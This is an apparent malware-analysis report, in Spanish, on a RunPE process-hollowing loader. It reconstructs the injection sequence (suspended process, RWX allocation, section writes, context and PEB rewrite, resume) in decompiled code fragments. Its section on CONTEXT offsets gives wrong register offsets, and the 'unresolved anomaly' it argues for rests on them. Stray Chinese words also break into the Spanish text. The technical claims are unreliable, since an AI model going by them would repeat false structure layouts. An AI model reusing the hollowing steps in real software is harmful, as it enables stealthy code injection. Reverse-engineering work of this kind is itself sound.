# RunPE (`execute_stage.bin`) — proceso hollowing

52.736 B, 69 funciones. **Nunca se había decompilado con Hex-Rays**: REA/Ghidra
le veían 157 procedimientos pero nunca se pasó por el descompilador. Ahora sí:
12 funciones extraídas (12/12, 0 fallos) en `hexrays/RUNPE_*.c`.

---

## 1. Lo más importante: es código público

```
C:\Aplicaciones\Visual Studio\Auto Updated\Process-Hollowing-main\Source\x64\Release\runpe.pdb
```

**Es el proyecto público `ProcessHollowing-main`**, compilado con Visual Studio
en un Windows en español (`C:\Aplicaciones\`). Esto no es código del atacante: es
una herramienta标准的 de process hollowing reutilizada tal cual. El PDB con
`runpe.pdb` y el banner `PDB Process-Hollowing-main\...\runpe.pdb` ya lo apuntaban,
pero sin decompilar no se podía dimensionar cuánto había cambiado.

**Efecto para el análisis**: el hollowing en sí no aporta nada nuevo; lo
interesante es **cómo y qué** inyecta.

---

## 2. Uso

```
RunPE.exe <payload.exe> <proceso_objetivo.exe>
```

```c
if (argc != 3) {
  RtlAdjustPrivilege(0x13, 1, 0, OldValue);        // 0x13 = 19 = SE_DEBUG_PRIVILEGE
  NtRaiseHardError(0xC0000420, 0, 0, 0, 6, &pBuffer);
  return -1;
}
```

---

## 3. Secuencia completa

### 3.1 Cargar y validar el payload

```c
CreateFileA(argv[1], GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
v11 = HeapAlloc(GetProcessHeap(), 0, GetFileSize(hFile, 0));
ReadFile(hFile, v11, size, 0, 0);
if ( *(int *)((char *)v11 + v11[15]) != 17744 ) return -1;   // v11[15] = e_lfanew (offset 60)
                                                                 // 17744 = 0x4550 = "PE"
```

### 3.2 Crear el objetivo suspendido y leer su PEB

```c
CreateProcessA(argv[2], NULL, NULL, NULL, /*bInheritHandles*/1,
                CREATE_SUSPENDED /*0x4*/, NULL, NULL, &si, &pi);
IsWow64Process(pi.hProcess, &Wow64Process);
```

### 3.3 Dos validaciones poco comunes

**Bitness del payload contra el objetivo:**

```c
if ( *(WORD *)(v11 + e_lfanew + 24) == 267 )   // 267 = 0x10B = PE32+ (64 bits)
     { if (!Wow64) ERROR; }                    // payload 64 contra objetivo 32 -> error
else { if (Wow64) ERROR; }                     // payload 32 contra objetivo 64 -> error
```

**Subsistema del payload contra el del proceso en ejecución:**

```c
v17 = *(WORD *)(v11 + e_lfanew + 92);                      // OptionalHeader.Subsystem
v18 = Wow64 ? sub_1400010B0(pi.hProcess)                   // lee el subsistema del proceso
            : sub_1400011F0(pi.hProcess);
if (v17 != v18) ERROR;
```

Lo segundo es inusual: la mayoría del hollowing no comprueba el subsistema. Evita
inyectar una app GUI en un servicio o al revés.

### 3.4 Inyección

```c
base = VirtualAllocEx(pi.hProcess, ImageBase, SizeOfImage,
                      MEM_COMMIT|MEM_RESERVE /*0x3000*/,
                      PAGE_EXECUTE_READWRITE /*0x40*/);
WriteProcessMemory(pi.hProcess, base, pe_buf, SizeOfHeaders, 0);
for (i = 0; i < NumberOfSections; i++)
    WriteProcessMemory(pi.hProcess, base + VirtualAddress,
                       pe_buf + PointerToRawData, SizeOfRawData, 0);
```

### 3.5 Reescribir el contexto y reanudar

```c
GetThreadContext(pi.hThread, &ctx);       // ctx en [rbp+0x470], ContextFlags en ctx+0x30
...
mov eax, dword [pe + 0x28]                // AddressOfEntryPoint
add rax, r15                              // + base remoto
mov qword [rbp + 0x20], rax               // escribe el entry
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

También escribe el **PEB del proceso** con `WriteProcessMemory`, para que las
llamadas a `NtQueryInformationProcess` y similares devuelvan la imagen inyectada:

```c
WriteProcessMemory(pi.hProcess, ctx_field + 0x10, pe_header_ptr, 8, 0);
```

### 3.6 Dos caminos, simétricos

| | 64 bits | WoW64 |
|---|---|---|
| Obtener contexto | `GetThreadContext` | `Wow64GetThreadContext` |
| Escribir contexto | `SetThreadContext` | `Wow64SetThreadContext` |
| Ruta alternativa | `sub_140001340` | `sub_140001640` |

`sub_140001340` y `sub_140001640` (754 y 753 B — casi gemelas) son las dos
implementaciones de hollowing, una por bitness. Se llaman desde `main` cuando la
ruta principal no procede.

---

## 4. Lo que NO pude determinar — y por qué

**Los offsets del `CONTEXT` no encajan con el layout estándar**, y no lo fuerzo.

Verificado en ensamblador:

```asm
lea rdx, [rbp + 0x470]              ; base del CONTEXT
mov dword [rbp + 0x4a0], 0x10000B   ; ContextFlags en base+0x30  ✓ correcto
mov rdx, qword [rbp + 0x4f8]        ; base+0x88
add rdx, 0x10                       ; -> base+0x98
ReadProcessMemory(hProcess, rdx, &buf, 8, 0)
...
mov qword [rbp + 0x20], rax         ; base+0x80 = entry point
SetThreadContext(hThread, &CONTEXT)
```

En un `CONTEXT64` estándar: `Rcx` = 0x88, `Rip` = 0xF8, `Rsp` = 0xA0. Los offsets
0x88 (lectura del PEB) y 0x80 (entry point) caen ambos dentro de `FloatSave`
(0x38–0xEF). **No son `Rsp` ni `Rip`.**

Posibilidades, y **no puedo distinguir entre ellas con análisis estático**:

1. El código depende del estado de registros en el arranque del hilo (el PEB vía
   `gs:[0x60]` se resolvería con `Rcx`/`Rdx` en某些 convenciones de arranque)
2. Estructura `CONTEXT` propia, no la del SDK
3. El hollowing está **adaptado** y escribe en campos que sólo funcionan en la
   práctica bajo determinadas condiciones

Lo que **sí** afirmo: la secuencia es hollowing (suspendido → VirtualAllocEx →
escritura de cabeceras y secciones → reescritura de contexto → ResumeThread) y el
PEB del objetivo se sobrescribe. Eso es verificable en el ensamblador. **El campo
concreto que recibe el entry point, no.**

Nota: Hex-Rays etiqueta el campo como `Context.Rcx`, lo cual es coherente con el
offset 0x80… pero **no** con un hollowing funcional, porque no es `RIP`. Por eso
lo dejo abierto.

---

## 5. Recuento de APIs

Las que aparecen en el pseudocode, en orden de uso:

```
CreateFileA  GetFileSize  GetProcessHeap  HeapAlloc  ReadFile  CloseHandle
CreateProcessA  IsWow64Process
GetThreadContext  Wow64GetThreadContext
ReadProcessMemory  WriteProcessMemory
VirtualAllocEx  SetThreadContext  Wow64SetThreadContext  ResumeThread
TerminateProcess  HeapFree
RtlAdjustPrivilege  NtRaiseHardError
```

Ausentes y relevantes: **no hay `NtUnmapViewOfSection`**. El hollowing reserva
espacio con `VirtualAllocEx` y sobrescribe, sin vaciar la imagen original
previamente. Es un hollowing *overlay*, no un *replacement* clásico.

---

## 6. Para el informe general

El RunPE es **herramienta pública sin modificar**. Eso cambia el foco: lo
interesante del loader no es cómo hollowa, sino **qué** inyecta
(`14ddg0941cvah.exe` y `34dbbmddg71c.exe`, que no están en el paquete RAR y se
descargan del C2) y **dónde** (`HD-Player.exe`, `MEmu.exe`). Los payloads
siguen sin estar capturados: son el siguiente objetivo lógico.